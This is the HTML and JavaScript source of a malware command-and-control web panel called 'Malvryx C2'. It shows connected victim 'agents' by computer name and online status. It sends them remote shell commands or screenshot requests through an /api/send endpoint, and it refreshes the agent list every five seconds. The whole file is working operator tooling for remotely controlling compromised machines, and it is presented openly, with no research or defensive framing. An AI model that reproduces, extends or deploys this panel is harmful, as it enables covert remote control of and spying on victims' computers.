<!DOCTYPE html>
<html>
<head>
    <title>Malvryx C2</title>
    <style>
        body { background: #0a0a0a; color: #00ff88; font-family: monospace; padding: 20px; }
        .container { max-width: 1200px; margin: auto; }
        h1 { color: #00ff88; }
        .status { background: #111; border: 1px solid #00ff8844; border-radius: 8px; padding: 15px; margin: 15px 0; display: flex; gap: 30px; flex-wrap: wrap; }
        .grid { display: grid; grid-template-columns: 280px 1fr; gap: 20px; }
        .sidebar { background: #111; border: 1px solid #00ff8844; border-radius: 8px; padding: 15px; max-height: 70vh; overflow-y: auto; }
        .agent-item { padding: 10px; border-bottom: 1px solid #00ff8822; cursor: pointer; }
        .agent-item:hover { background: #00ff8822; }
        .main { background: #111; border: 1px solid #00ff8844; border-radius: 8px; padding: 20px; }
        .main select, .main input { width: 100%; padding: 8px; background: #0a0a0a; border: 1px solid #00ff8855; color: #00ff88; border-radius: 4px; margin: 5px 0; }
        .main button { background: #00ff8833; border: 2px solid #00ff88; color: #00ff88; padding: 10px; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 10px; font-weight: bold; }
        .main button:hover { background: #00ff8866; }
        .output { background: #0a0a0a; padding: 15px; border-radius: 8px; margin-top: 15px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; font-size: 12px; border-left: 3px solid #ffaa33; }
        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
        .flex>* { flex: 1; min-width: 100px; }
        .online { color: #00ff88; }
        .offline { color: #ff4444; }
    </style>
</head>
<body>
<div class="container">
    <h1>☠️ Malvryx C2 Panel</h1>
    <div class="status">
        <div>Agents: <span id="totalAgents">0</span></div>
        <div>Online: <span id="onlineAgents">0</span></div>
        <div>Commands: <span id="totalCommands">0</span></div>
        <div>C2: <span id="c2Status">● Online</span></div>
    </div>
    <div class="grid">
        <div class="sidebar">
            <h3 style="color:#ffaa33;">📡 Agents</h3>
            <div id="agents">// No agents connected</div>
        </div>
        <div class="main">
            <h3 style="color:#ffaa33;">🎮 Command Center</h3>
            <div class="flex">
                <select id="commandSelect">
                    <option value="cmd">Shell Command</option>
                    <option value="screenshot">Screenshot</option>
                </select>
                <input type="text" id="commandData" placeholder="Command data">
                <input type="text" id="commandArgs" placeholder="Args">
            </div>
            <button onclick="sendCommand()">🚀 Send Command</button>
            <div class="output" id="output">// Select an agent</div>
        </div>
    </div>
</div>
<script>
const C2 = window.location.origin;
let selected = null;

async function refreshAgents() {
    try {
        const r = await fetch('/api/agents');
        const data = await r.json();
        const div = document.getElementById('agents');
        if (!data.length) { div.innerHTML = '// No agents'; return; }
        div.innerHTML = data.map(a => `
            <div class="agent-item" onclick="selectAgent('${a.id}')">
                <div class="${a.online ? 'online' : 'offline'}">${a.online ? '●' : '○'} ${a.id}</div>
                <div style="font-size:11px;color:#88ffaa88;">${a.info?.computer || 'Unknown'}</div>
            </div>
        `).join('');
        document.getElementById('totalAgents').textContent = data.length;
        document.getElementById('onlineAgents').textContent = data.filter(a => a.online).length;
    } catch (e) {
        document.getElementById('agents').innerHTML = '// API error';
    }
}

function selectAgent(id) { selected = id; document.getElementById('output').innerHTML = '// Agent ' + id + ' selected'; }

async function sendCommand() {
    if (!selected) { alert('Select agent'); return; }
    const cmd = document.getElementById('commandSelect').value;
    const data = document.getElementById('commandData').value;
    const args = document.getElementById('commandArgs').value;
    try {
        const r = await fetch('/api/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ agentId: selected, command: cmd, data, args })
        });
        const res = await r.json();
        document.getElementById('output').innerHTML = JSON.stringify(res, null, 2);
    } catch (e) {
        document.getElementById('output').innerHTML = '❌ Error: ' + e.message;
    }
}

refreshAgents();
setInterval(refreshAgents, 5000);
</script>
</body>
</html>
